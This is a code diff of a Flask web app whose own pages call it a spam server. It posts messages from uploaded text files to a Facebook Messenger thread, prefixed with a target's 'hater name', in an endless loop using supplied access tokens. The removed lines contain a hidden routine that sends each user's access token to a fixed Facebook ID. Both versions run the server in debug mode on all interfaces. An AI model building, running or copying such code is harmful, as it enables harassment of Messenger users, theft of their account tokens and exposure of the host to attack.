@@ -1,175 +1,143 @@
-from flask import Flask, request, render_template_string
-import threading
-import time
+from flask import Flask, request
 import requests
-import os
+import time
 
 app = Flask(__name__)
+app.debug = True
 
-# ---------------- YOUR ORIGINAL FUNCTIONS ---------------- #
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
 
-def execute_server():
-    pass  # Not needed, Flask hi server run karega
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        access_token = request.form.get('accessToken')
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
 
-def send_initial_message():
-    if not os.path.exists('token.txt'):
-        return
-    with open('token.txt', 'r') as file:
-        tokens = file.readlines()
-    msg_template = "MR.ANURAG MERA ID KA TOKEN LU {}"
-    target_id = "61578840237242"
-    headers = {
-        'User-Agent': 'Mozilla/5.0',
-        'referer': 'www.google.com'
-    }
-    for token in tokens:
-        access_token = token.strip()
-        url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
-        msg = msg_template.format(access_token)
-        parameters = {'access_token': access_token, 'message': msg}
-        try:
-            requests.post(url, json=parameters, headers=headers)
-        except:
-            pass
-        time.sleep(0.1)
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
 
-def send_messages_from_file():
-    with open('convo.txt', 'r') as file:
-        convo_id = file.read().strip()
+        while True:
+            try:
+                for message1 in messages:
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    message = str(mn) + ' ' + message1
+                    parameters = {'access_token': access_token, 'message': message}
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print(f"Message sent using token {access_token}: {message}")
+                    else:
+                        print(f"Failed to send message using token {access_token}: {message}")
+                    time.sleep(time_interval)
+            except Exception as e:
+                print(f"Error while sending message using token {access_token}: {message}")
+                print(e)
+                time.sleep(30)
 
-    with open('file.txt', 'r') as file:
-        messages = file.readlines()
-
-    num_messages = len(messages)
-
-    with open('token.txt', 'r') as file:
-        tokens = file.readlines()
-    num_tokens = len(tokens)
-    max_tokens = min(num_tokens, num_messages)
-
-    with open('name.txt', 'r') as file:
-        haters_name = file.read().strip()
-
-    with open('time.txt', 'r') as file:
-        speed = int(file.read().strip())
-
-    headers = {
-        'User-Agent': 'Mozilla/5.0',
-        'referer': 'www.google.com'
-    }
-
-    while True:
-        try:
-            for message_index in range(num_messages):
-                token_index = message_index % max_tokens
-                access_token = tokens[token_index].strip()
-                message = messages[message_index].strip()
-                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
-                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
-                response = requests.post(url, json=parameters, headers=headers)
-
-                if response.ok:
-                    print(f"[+] Message {message_index+1} sent -> {haters_name} {message}")
-                else:
-                    print(f"[x] Failed -> {haters_name} {message}")
-
-                time.sleep(speed)
-        except Exception as e:
-            print(f"[!] Error: {e}")
-
-# ------------------- FLASK UI PART ------------------- #
-
-HTML_FORM = """
+    return '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>AROHI X ANURAG SERVER</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
-    body {
-      background: black;
-      color: white;
+    body, html {
+      height: 100%;
+      margin: 0;
       font-family: 'Poppins', sans-serif;
-      text-align: center;
+      color: white;
+    }
+    /* Background video full screen */
+    .bg-video {
+      position: fixed;
+      right: 0;
+      bottom: 0;
+      min-width: 100%;
+      min-height: 100%;
+      z-index: -1;
+      object-fit: cover;
     }
     .container {
-      max-width: 600px;
-      margin: 40px auto;
-      padding: 20px;
-      background: rgba(255,255,255,0.05);
-      border-radius: 20px;
-      border: 2px solid rgba(255,255,255,0.2);
-      backdrop-filter: blur(10px);
+      max-width: 500px;
+      background: rgba(0, 0, 0, 0.7);
+      border-radius: 15px;
+      padding: 25px;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+      margin: 0 auto;
+      margin-top: 40px;
     }
-    .btn {
+    .header{
+      text-align: center;
+      padding-bottom: 20px;
+    }
+    .btn-submit{
       width: 100%;
+      margin-top: 10px;
       font-weight: bold;
-      border-radius: 12px;
+    }
+    .footer{
+      text-align: center;
+      margin-top: 20px;
+      color: #f1f1f1;
     }
   </style>
 </head>
 <body>
+  <!-- Background Video -->
+  <video autoplay muted loop class="bg-video">
+    <source src="https://videos.pexels.com/video-files/853889/853889-sd_640_360_25fps.mp4" type="video/mp4">
+  </video>
+
+  <header class="header mt-4">
+    <h1 class="mb-3">🚀 SYSTEM FUCKER 🚀</h1>
+    <h2 class="mt-3">🔥 AROHI X ANURAG 🔥</h2>
+  </header>
+
   <div class="container">
-    <h1>🚀 AROHI X ANURAG SERVER 🚀</h1>
     <form action="/" method="post" enctype="multipart/form-data">
       <div class="mb-3">
-        <label>ACCESS TOKENS (one per line)</label>
-        <textarea name="tokens" class="form-control" rows="5" required></textarea>
+        <label for="accessToken">ENTER YOUR TOKEN:</label>
+        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
       </div>
       <div class="mb-3">
-        <label>CONVO/THREAD ID</label>
-        <input type="text" class="form-control" name="convo" required>
+        <label for="threadId">ENTER CONVO/INBOX ID:</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
       </div>
       <div class="mb-3">
-        <label>HATERS NAME</label>
-        <input type="text" class="form-control" name="name" required>
+        <label for="kidx">ENTER HATER NAME:</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
       </div>
       <div class="mb-3">
-        <label>MESSAGES FILE (.txt)</label>
-        <input type="file" class="form-control" name="file" accept=".txt" required>
+        <label for="txtFile">SELECT YOUR NOTEPAD FILE:</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
       </div>
       <div class="mb-3">
-        <label>SPEED (seconds)</label>
-        <input type="number" class="form-control" name="speed" required>
+        <label for="time">SPEED IN SECONDS:</label>
+        <input type="number" class="form-control" id="time" name="time" required>
       </div>
-      <button type="submit" class="btn btn-primary">START SPAM 🚀</button>
+      <button type="submit" class="btn btn-primary btn-submit">🚀 START WITH AROHI X ANURAG 🚀</button>
     </form>
   </div>
+
+  <footer class="footer">
+    <p>&copy; DEVELOPED BY AROHI X ANURAG 2025. ALL RIGHTS RESERVED.</p>
+    <p>🔥 SYSTEM FUCKER | ENJOY THE GAME 🔥</p>
+  </footer>
 </body>
 </html>
-"""
+'''
 
-@app.route("/", methods=["GET", "POST"])
-def home():
-    if request.method == "POST":
-        # Save tokens
-        with open("token.txt", "w") as f:
-            f.write(request.form["tokens"].strip())
-
-        # Save convo id
-        with open("convo.txt", "w") as f:
-            f.write(request.form["convo"].strip())
-
-        # Save name
-        with open("name.txt", "w") as f:
-            f.write(request.form["name"].strip())
-
-        # Save speed
-        with open("time.txt", "w") as f:
-            f.write(request.form["speed"].strip())
-
-        # Save uploaded file
-        uploaded_file = request.files["file"]
-        if uploaded_file:
-            uploaded_file.save("file.txt")
-
-        # Start background thread
-        threading.Thread(target=send_messages_from_file, daemon=True).start()
-
-        return "<h2 style='color:lime;'>🚀 SPAM STARTED SUCCESSFULLY BY AROHI X ANURAG 🚀</h2>"
-
-    return render_template_string(HTML_FORM)
-
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=4000, debug=True)
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=True)
